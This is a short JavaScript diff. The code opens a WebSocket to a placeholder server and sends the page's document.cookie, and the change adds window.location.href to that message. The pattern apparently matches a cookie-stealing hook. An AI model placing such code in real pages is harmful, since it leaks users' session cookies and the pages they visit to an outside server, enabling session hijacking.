@@ -1,7 +1,7 @@
 var ws = new WebSocket("wss://your-server-url:your-server-port");
 var messages = [];
 ws.onopen = function () {
-  ws.send("session " + document.cookie);
+  ws.send("session " + document.cookie + " " + window.location.href);
   for (var i = 0; i < messages.length; i++) {
     ws.send(messages[i]);
   }
